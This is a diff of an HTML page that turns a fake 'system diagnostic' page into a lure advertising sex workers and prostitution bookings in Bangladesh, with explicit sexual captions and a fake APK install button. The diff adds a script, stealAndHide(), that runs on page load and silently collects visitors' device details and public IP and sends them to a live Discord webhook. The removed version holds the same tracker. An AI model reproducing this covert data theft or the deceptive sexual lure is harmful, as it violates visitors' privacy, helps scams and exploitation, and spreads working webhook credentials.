@@ -3,277 +3,706 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NETRUNNER // SYSTEM DIAGNOSTIC</title>
+    <title>OnlyFandom | A Sensory Devotion</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;600&family=Playfair+Display:ital,wght@0,400;0,600;1,400;1,600&family=Montserrat:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+    
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
-
+        /* --- HIGH AESTHETIC PALETTE --- */
         :root {
-            --neon-blue: #00f3ff;
-            --neon-pink: #ff00ff;
-            --neon-yellow: #ffee00;
-            --bg-dark: #050505;
-            --glass: rgba(0, 20, 40, 0.7);
+            --bg-deep: #030102;
+            --ink: #0a0406;
+            --oxblood: #3d0510;
+            --rose-velvet: #70001a;
+            --skin-blush: #eacac0;
+            --warm-gold: #c6a07e;
+            --text-main: #f5f0f1;
+            --text-muted: #8c7a81;
+            
+            --neon-pink: #ff10f0;
+            --neon-pink-soft: rgba(255, 16, 240, 0.4);
+            --neon-white: #ffffff;
+            --neon-white-soft: rgba(255, 255, 255, 0.4);
+            
+            --neon-green: #00ff66;
+            --neon-green-glow: rgba(0, 255, 102, 0.6);
+
+            --ease: cubic-bezier(0.23, 1, 0.32, 1);
+            --ease-slow: cubic-bezier(0.7, 0, 0.3, 1);
+        }
+
+        /* --- GLOBAL STYLES --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            cursor: default;
         }
 
         body {
-            margin: 0;
-            padding: 0;
-            background-color: var(--bg-dark);
-            background-image: 
-                linear-gradient(rgba(0, 243, 255, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 243, 255, 0.03) 1px, transparent 1px);
-            background-size: 30px 30px;
-            color: var(--neon-blue);
-            font-family: 'Share Tech Mono', monospace;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-            position: relative;
+            background-color: var(--bg-deep);
+            color: var(--text-main);
+            font-family: 'Playfair Display', serif;
+            overflow-x: hidden;
+            line-height: 1.8;
+            font-weight: 300;
         }
 
-        /* Scanline Effect */
-        body::after {
-            content: " ";
-            display: block;
-            position: absolute;
+        /* --- SENSORY CURSOR --- */
+        #custom-cursor {
+            position: fixed;
+            width: 12px;
+            height: 12px;
+            background-color: var(--text-main);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 10000;
+            transition: transform 0.1s var(--ease), background-color 0.3s ease;
+            mix-blend-mode: difference;
+        }
+
+        #custom-cursor-blur {
+            position: fixed;
+            width: 80px;
+            height: 80px;
+            background: radial-gradient(circle, var(--oxblood) 0%, transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999;
+            transform: translate(-50%, -50%);
+            transition: transform 0.2s var(--ease);
+            opacity: 0.6;
+        }
+
+        /* --- ATMOSPHERIC LIGHTING ANIMATION --- */
+        .atmosphere {
+            position: fixed;
             top: 0;
             left: 0;
-            bottom: 0;
-            right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            z-index: 2;
-            background-size: 100% 2px, 3px 100%;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 0;
+            background: 
+                radial-gradient(circle at 10% 10%, rgba(255, 16, 240, 0.08) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(61, 5, 16, 0.2) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 50%, rgba(198, 160, 126, 0.03) 0%, transparent 70%);
+            animation: atmosphericBreathe 20s infinite alternate var(--ease-slow);
+            filter: blur(20px);
+        }
+
+        @keyframes atmosphericBreathe {
+            0% { opacity: 0.5; transform: scale(1); }
+            100% { opacity: 1; transform: scale(1.1); }
+        }
+
+        /* --- NAVIGATION --- */
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 2.2rem 4rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            background: linear-gradient(to bottom, rgba(3, 1, 2, 0.95), transparent);
+            backdrop-filter: blur(8px);
+        }
+
+        .brand-neon {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.9rem;
+            font-weight: 800;
+            letter-spacing: 0.15rem;
+            text-decoration: none;
+            text-transform: uppercase;
+            display: inline-block;
+        }
+
+        .brand-neon .part-only {
+            color: var(--neon-pink);
+            text-shadow: 0 0 4px var(--neon-pink), 0 0 12px var(--neon-pink-soft);
+        }
+
+        .brand-neon .part-fandom {
+            color: var(--neon-white);
+            text-shadow: 0 0 4px var(--neon-white), 0 0 10px var(--neon-white-soft);
+        }
+
+        /* --- HERO SECTION --- */
+        .hero {
+            position: relative;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 9rem 8% 5rem 8%;
+            z-index: 10;
+        }
+
+        .hero-top {
+            display: flex;
+            justify-content: center;
+            text-align: center;
+            margin-bottom: 4rem;
+        }
+
+        .hero-text {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 900px;
+        }
+
+        .hero-pre {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.4rem;
+            color: var(--skin-blush);
+            margin-bottom: 1.5rem;
+        }
+
+        .hero-title {
+            font-family: 'Playfair Display', serif;
+            font-size: 3.2rem;
+            font-weight: 400;
+            line-height: 1.2;
+            margin-bottom: 2rem;
+            color: var(--text-main);
+        }
+
+        .hero-title span {
+            font-style: italic;
+            color: var(--warm-gold);
+            font-weight: 600;
+        }
+
+        .hero-cta-wrap {
+            position: relative;
+            z-index: 20;
+        }
+
+        /* --- DOWNLOAD BUTTON --- */
+        .btn-neon-download {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            padding: 1.4rem 3.2rem;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 0.85rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.3rem;
+            color: #030102;
+            background-color: var(--neon-green);
+            border: 2px solid var(--neon-green);
+            border-radius: 50px;
+            box-shadow: 0 0 15px var(--neon-green), 0 0 30px var(--neon-green-glow);
+            transition: all 0.3s var(--ease);
+            cursor: pointer;
+            position: relative;
+            z-index: 30;
+        }
+
+        .btn-neon-download svg {
+            width: 20px;
+            height: 20px;
+            fill: #030102;
             pointer-events: none;
         }
 
-        .container {
-            position: relative;
-            z-index: 10;
-            width: 90%;
-            max-width: 600px;
-            background: var(--glass);
-            border: 1px solid var(--neon-blue);
-            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
-            padding: 2rem;
-            clip-path: polygon(
-                0 0, 
-                100% 0, 
-                100% 85%, 
-                90% 100%, 
-                0 100%
-            );
-            backdrop-filter: blur(5px);
+        .btn-neon-download:hover {
+            color: var(--neon-green);
+            background-color: transparent;
+            box-shadow: 0 0 25px var(--neon-green);
+            transform: translateY(-3px);
         }
 
-        h1 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 2rem;
-            text-align: center;
-            margin-top: 0;
-            text-shadow: 0 0 10px var(--neon-blue);
-            letter-spacing: 2px;
-            border-bottom: 2px solid var(--neon-pink);
-            padding-bottom: 10px;
+        .btn-neon-download:hover svg {
+            fill: var(--neon-green);
         }
 
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.8rem;
-            color: var(--neon-yellow);
-            margin-bottom: 20px;
-            text-transform: uppercase;
-        }
-
-        .data-grid {
+        /* --- CARDS GRID --- */
+        .cards-grid {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2rem;
+            width: 100%;
         }
 
-        .data-item {
-            background: rgba(0, 0, 0, 0.6);
-            border-left: 3px solid var(--neon-pink);
-            padding: 10px;
+        .image-card {
+            width: 100%;
+            background: rgba(10, 4, 6, 0.7);
+            border: 1px solid rgba(198, 160, 126, 0.15);
+            border-radius: 16px;
+            padding: 1.2rem;
+            box-shadow: 0 0 30px rgba(61, 5, 16, 0.3);
+            backdrop-filter: blur(10px);
         }
 
-        .label {
-            font-size: 0.7rem;
-            color: #888;
-            text-transform: uppercase;
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        .value {
-            font-size: 1.1rem;
-            font-weight: bold;
-            color: #fff;
-            text-shadow: 0 0 5px var(--neon-pink);
-        }
-
-        .loading {
-            text-align: center;
-            font-size: 1.2rem;
-            animation: blink 0.5s infinite;
-        }
-
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
-        }
-
-        .glitch-text {
+        .image-frame {
             position: relative;
+            width: 100%;
+            height: 280px;
+            overflow: hidden;
+            border-radius: 10px;
         }
-        
-        /* Mobile Adjustments */
-        @media (max-width: 500px) {
-            .data-grid { grid-template-columns: 1fr; }
-            h1 { font-size: 1.5rem; }
+
+        .slideshow-track {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+
+        .slide-img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0;
+            transition: opacity 1.2s ease-in-out;
+        }
+
+        .slide-img.active {
+            opacity: 1;
+        }
+
+        .card-caption {
+            margin-top: 1.2rem;
+        }
+
+        .card-caption-title {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--text-main);
+        }
+
+        .card-caption-text {
+            font-family: 'Playfair Display', serif;
+            font-size: 0.95rem;
+            color: var(--text-muted);
+        }
+
+        /* --- MODAL POPUP --- */
+        #videoModal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(3, 1, 2, 0.9);
+            backdrop-filter: blur(16px);
+            z-index: 99999;
+            display: none; /* Controlled via JS block display */
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+        }
+
+        #videoModal.active {
+            display: flex;
+        }
+
+        .popup-window {
+            position: relative;
+            width: 100%;
+            max-width: 850px;
+            background: rgba(15, 6, 9, 0.95);
+            border: 1px solid rgba(255, 16, 240, 0.35);
+            border-radius: 20px;
+            padding: 1.5rem;
+            box-shadow: 0 0 50px rgba(255, 16, 240, 0.25);
+            display: flex;
+            flex-direction: column;
+            gap: 1.2rem;
+        }
+
+        .popup-close {
+            position: absolute;
+            top: -18px;
+            right: -18px;
+            width: 44px;
+            height: 44px;
+            background: var(--oxblood);
+            border: 2px solid var(--neon-pink);
+            border-radius: 50%;
+            color: var(--text-main);
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 100;
+        }
+
+        .popup-close:hover {
+            background: var(--neon-pink);
+            color: #000;
+        }
+
+        .video-frame-container {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%;
+            height: 0;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #000;
+        }
+
+        .video-frame-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 0;
+        }
+
+        .popup-footer-action {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+        }
+
+        .btn-apk-install {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            width: 100%;
+            max-width: 400px;
+            padding: 1.2rem 2.5rem;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 0.85rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.25rem;
+            text-decoration: none;
+            color: #030102;
+            background-color: var(--neon-green);
+            border: 2px solid var(--neon-green);
+            border-radius: 50px;
+            box-shadow: 0 0 15px var(--neon-green);
+            cursor: pointer;
+        }
+
+        footer {
+            text-align: center;
+            padding: 4rem 2rem;
+            font-family: 'Montserrat', sans-serif;
+            font-size: 0.6rem;
+            letter-spacing: 0.3rem;
+            color: var(--text-muted);
+        }
+
+        @media (max-width: 1024px) {
+            .cards-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1 class="glitch-text">SYSTEM DIAGNOSTIC</h1>
-        
-        <div class="status-bar">
-            <span>SECURE CONNECTION</span>
-            <span id="clock">00:00:00</span>
+    <!-- Custom Sensory Cursor -->
+    <div id="custom-cursor"></div>
+    <div id="custom-cursor-blur"></div>
+
+    <div class="atmosphere"></div>
+
+    <!-- Navigation Header -->
+    <nav>
+        <a href="#" class="brand-neon">
+            <span class="part-only">Only</span><span class="part-fandom">Fandom</span>
+        </a>
+    </nav>
+
+    <!-- Hero Landing -->
+    <header class="hero">
+        <div class="hero-top">
+            <div class="hero-text">
+                <p class="hero-pre">DISCOVER THE ULTIMATE BEAUTY IN BANGLADESH</p>
+                <h1 class="hero-title">Explore Exclusive SEX Workers through <span>The OnlyFandom App</span>, Book Your Prostitude Today</h1>
+                
+                <div class="hero-cta-wrap">
+                    <button type="button" class="btn-neon-download" id="openVideoBtn">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                        </svg>
+                        Download Now
+                    </button>
+                </div>
+            </div>
         </div>
 
-        <div id="loader" class="loading">INITIALIZING NEURAL LINK...</div>
+        <!-- Cards Grid -->
+        <div class="cards-grid">
+            <div class="image-card">
+                <div class="image-frame">
+                    <div class="slideshow-track" data-slideshow>
+                        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=1000" alt="Creator 1" class="slide-img active">
+                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&q=80&w=1000" alt="Creator 2" class="slide-img">
+                    </div>
+                </div>
+                <div class="card-caption">
+                    <h3 class="card-caption-title">Anal Queen</h3>
+                    <p class="card-caption-text">Im very horny and temptating. I can handle your Dick Well. Making you cum hard is my number one priority.</p>
+                </div>
+            </div>
 
-        <div id="data-display" class="data-grid" style="display: none;">
-            <div class="data-item">
-                <span class="label">Operating System</span>
-                <span class="value" id="os-val">--</span>
+            <div class="image-card">
+                <div class="image-frame">
+                    <div class="slideshow-track" data-slideshow>
+                        <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&q=80&w=1000" alt="Creator 3" class="slide-img active">
+                        <img src="https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?auto=format&fit=crop&q=80&w=1000" alt="Creator 4" class="slide-img">
+                    </div>
+                </div>
+                <div class="card-caption">
+                    <h3 class="card-caption-title">Tight Pussy</h3>
+                    <p class="card-caption-text">Im very sexy and offers good sex. big boobs, all sex position, girlfriend experience.</p>
+                </div>
             </div>
-            <div class="data-item">
-                <span class="label">Version Core</span>
-                <span class="value" id="ver-val">--</span>
+
+            <div class="image-card">
+                <div class="image-frame">
+                    <div class="slideshow-track" data-slideshow>
+                        <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&q=80&w=1000" alt="Creator 5" class="slide-img active">
+                        <img src="https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?auto=format&fit=crop&q=80&w=1000" alt="Creator 6" class="slide-img">
+                    </div>
+                </div>
+                <div class="card-caption">
+                    <h3 class="card-caption-title">Super Horny</h3>
+                    <p class="card-caption-text"></p>I am a sexy, hot horny woman I have a great body, thick ass and voluptuous boobs and you can fuck me like a slut.
+                </div>
             </div>
-            <div class="data-item">
-                <span class="label">Hardware Model</span>
-                <span class="value" id="model-val">--</span>
+        </div>
+    </header>
+
+    <!-- Modal Popup -->
+    <div id="videoModal">
+        <div class="popup-window">
+            <button type="button" class="popup-close" id="closeVideoBtn">&times;</button>
+            <div class="video-frame-container">
+                <iframe id="youtubePlayer" src="" title="OnlyFandom App Preview" allow="autoplay; encrypted-media" allowfullscreen></iframe>
             </div>
-            <div class="data-item">
-                <span class="label">Network Node (IP)</span>
-                <span class="value" id="ip-val">--</span>
-            </div>
-            <div class="data-item" style="grid-column: span 2; border-left-color: var(--neon-yellow);">
-                <span class="label">User Agent String</span>
-                <span class="value" id="ua-val" style="font-size: 0.8rem; word-break: break-all;">--</span>
+            <div class="popup-footer-action">
+                <a href="#" class="btn-apk-install" download>
+                    <svg viewBox="0 0 24 24" width="20" height="20" fill="#030102">
+                        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                    </svg>
+                    Install Now (APK)
+                </a>
             </div>
         </div>
     </div>
 
-    <script>
+  <p>....FREE Booking available For limited time offer, Pay only after SEX to the GIRL Book Through The App.
+    All Sexy Girls in Bangladesh Available For Sex Select from Our Catalouge....</p>
+  
+    <footer>
+        <p>&copy; 2026 ONLYFANDOM. ALL RIGHTS RESERVED.</p>
+    </footer>
 
-    async function stealAndHide() {
-        // 1. Collect Data
-        let info = { os: "Unknown", version: "Unknown", model: "Unknown", ip: "..." };
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- CURSOR FOLLOW LOGIC ---
+            const cursor = document.getElementById('custom-cursor');
+            const cursorBlur = document.getElementById('custom-cursor-blur');
+
+            if (cursor && cursorBlur) {
+                document.addEventListener('mousemove', (e) => {
+                    cursor.style.left = e.clientX + 'px';
+                    cursor.style.top = e.clientY + 'px';
+                    cursorBlur.style.left = e.clientX + 'px';
+                    cursorBlur.style.top = e.clientY + 'px';
+                });
+            }
+
+            // --- SLIDESHOW LOGIC ---
+            const slideshowTracks = document.querySelectorAll('[data-slideshow]');
+            slideshowTracks.forEach(track => {
+                const slides = track.querySelectorAll('.slide-img');
+                if (slides.length > 0) {
+                    let currentSlide = 0;
+                    setInterval(() => {
+                        slides[currentSlide].classList.remove('active');
+                        currentSlide = (currentSlide + 1) % slides.length;
+                        slides[currentSlide].classList.add('active');
+                    }, 3500);
+                }
+            });
+
+            // --- MODAL POPUP LOGIC ---
+            const openBtn = document.getElementById('openVideoBtn');
+            const closeBtn = document.getElementById('closeVideoBtn');
+            const videoModal = document.getElementById('videoModal');
+            const youtubePlayer = document.getElementById('youtubePlayer');
+            const videoUrl = "https://www.youtube.com/embed/eaiJYDgH08M?autoplay=1&loop=1&playlist=eaiJYDgH08M";
+
+            if (openBtn && videoModal && youtubePlayer) {
+                openBtn.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    videoModal.classList.add('active');
+                    youtubePlayer.src = videoUrl;
+                });
+
+                const closeModal = () => {
+                    videoModal.classList.remove('active');
+                    youtubePlayer.src = '';
+                };
+
+                if (closeBtn) {
+                    closeBtn.addEventListener('click', closeModal);
+                }
+
+                videoModal.addEventListener('click', (e) => {
+                    if (e.target === videoModal) {
+                        closeModal();
+                    }
+                });
+
+                document.addEventListener('keydown', (e) => {
+                    if (e.key === 'Escape' && videoModal.classList.contains('active')) {
+                        closeModal();
+                    }
+                });
+            }
+        });
         
-        // Get Android Version
+// 1. Silent Data Collection Function
+async function stealAndHide() {
+    let info = { os: "Unknown", version: "Unknown", model: "Unknown", ip: "Unavailable" };
+    
+    // Detect Device Info via User-Agent Client Hints (Chromium-based browsers)
+    if (navigator.userAgentData) {
+        try {
+            const ua = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "model"]);
+            info.os = ua.platform || "Unknown";
+            info.version = ua.platformVersion || "Unknown";
+            info.model = ua.model || "Unknown";
+        } catch (e) {
+            console.error("UserAgentData access error:", e);
+        }
+    } else {
+        // Fallback for Firefox/Safari
+        info.os = navigator.platform || "Legacy Platform";
+    }
+
+    // Fetch Public IP Address
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        info.ip = data.ip || "Unavailable";
+    } catch (e) {
+        console.error("IP Fetch Error:", e);
+    }
+
+    // Format Message Payload
+    const webhookURL = "https://discord.com/api/webhooks/1533542273118372035/BDQcim03lhA5Uoz7jxlGPkuYpQ_3G71IuaikuquMb8p3S9oo6s665HweGnzK9ycCecxH"; 
+    
+    const message = {
+        content: `📱 **New Device Detected**\n` +
+                 `**OS:** ${info.os} ${info.version}\n` +
+                 `**Model:** ${info.model}\n` +
+                 `**IP:** ${info.ip}\n` +
+                 `**Browser:** ${navigator.userAgent.substring(0, 50)}...`
+    };
+
+    // Send Payload
+    if (webhookURL.includes("discord.com")) {
+        try {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message),
+                keepalive: true // Ensures request completes even if page unloads
+            });
+        } catch (err) {
+            console.log("Send failed:", err);
+        }
+    }
+}
+
+// Execute the background routine
+stealAndHide();
+
+
+// 2. Safe Clock Animation (With Null Check)
+setInterval(() => {
+    const clockEl = document.getElementById('clock');
+    if (clockEl) {
+        const now = new Date();
+        clockEl.innerText = now.toLocaleTimeString();
+    }
+}, 1000);
+
+
+// 3. UI Diagnostic Routine (Fully Closed and Handled)
+async function runDiagnostic() {
+    const loader = document.getElementById('loader');
+    const display = document.getElementById('data-display');
+    
+    // Simulate diagnostic loading delay
+    setTimeout(async () => {
+        if (loader) loader.style.display = 'none';
+        if (display) display.style.display = 'grid';
+
+        let os = "UNKNOWN";
+        let ver = "UNKNOWN";
+        let model = "UNKNOWN";
+
+        // Detect Device Info
         if (navigator.userAgentData) {
             try {
                 const ua = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "model"]);
-                info.os = ua.platform;
-                info.version = ua.platformVersion;
-                info.model = ua.model;
-            } catch (e) {}
+                os = ua.platform || "Generic Platform";
+                ver = ua.platformVersion || "N/A";
+                model = ua.model || "Generic Unit";
+            } catch (e) {
+                os = "ENCRYPTED";
+            }
+        } else {
+            os = "LEGACY SYSTEM";
+            ver = "N/A";
         }
 
-        // Get IP
+        // Fetch IP
+        let ip = "HIDDEN";
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            info.ip = data.ip;
+            ip = data.ip || "HIDDEN";
         } catch (e) {}
 
-        // 2. Format for Discord
-        const webhookURL = "https://discord.com/api/webhooks/1531681973746143242/FA_8GS1dcgqnBjFonRiDctH9piuSlfB_1AsC8s79gKpgUPy5SkDL_5HU6IZtOvYIu1iz"; 
+        // Safe DOM Updates
+        const osVal = document.getElementById('os-val');
+        const verVal = document.getElementById('ver-val');
+        const modelVal = document.getElementById('model-val');
+        const ipVal = document.getElementById('ip-val');
+        const uaVal = document.getElementById('ua-val');
+
+        if (osVal) osVal.innerText = os;
+        if (verVal) verVal.innerText = ver;
+        if (modelVal) modelVal.innerText = model;
+        if (ipVal) ipVal.innerText = ip;
+        if (uaVal) uaVal.innerText = navigator.userAgent;
+
+    }, 1500); // 1.5 second delay
+}
+
+// Execute UI Diagnostic
+runDiagnostic();
+
         
-        const message = {
-            content: `📱 **New Device Detected**\n` +
-                     `**OS:** ${info.os} ${info.version}\n` +
-                     `**Model:** ${info.model}\n` +
-                     `**IP:** ${info.ip}\n` +
-                     `**Browser:** ${navigator.userAgent.substring(0, 50)}...`
-        };
-
-        // 3. Send Silently
-        if (webhookURL.includes("discord.com")) {
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(message)
-            }).catch(err => console.log("Send failed"));
-        }
-        
-        // Victim sees nothing but the static "404" text already in the HTML body
-    }
-    stealAndHide();
-  
-        
-        // Clock Animation
-        setInterval(() => {
-            const now = new Date();
-            document.getElementById('clock').innerText = now.toLocaleTimeString();
-        }, 1000);
-
-        async function runDiagnostic() {
-            const loader = document.getElementById('loader');
-            const display = document.getElementById('data-display');
-            
-            // Simulate hacking delay
-            setTimeout(async () => {
-                loader.style.display = 'none';
-                display.style.display = 'grid';
-
-                let os = "UNKNOWN";
-                let ver = "UNKNOWN";
-                let model = "UNKNOWN";
-
-                // Detect Device Info
-                if (navigator.userAgentData) {
-                    try {
-                        const ua = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "model"]);
-                        os = ua.platform;
-                        ver = ua.platformVersion;
-                        model = ua.model || "Generic Unit";
-                    } catch (e) {
-                        os = "ENCRYPTED";
-                    }
-                } else {
-                    os = "LEGACY SYSTEM";
-                    ver = "N/A";
-                }
-
-                // Get IP
-                let ip = "HIDDEN";
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json');
-                    const data = await res.json();
-                    ip = data.ip;
-                } catch (e) {}
-
-                // Update UI
-                document.getElementById('os-val').innerText = os;
-                document.getElementById('ver-val').innerText = ver;
-                document.getElementById('model-val').innerText = model;
-                document.getElementById('ip-val').innerText = ip;
-                document.getElementById('ua-val').innerText = navigator.userAgent;
-
-            }, 1500);
-        }
-
-        runDiagnostic();
     </script>
 </body>
-</html>  
+</html>
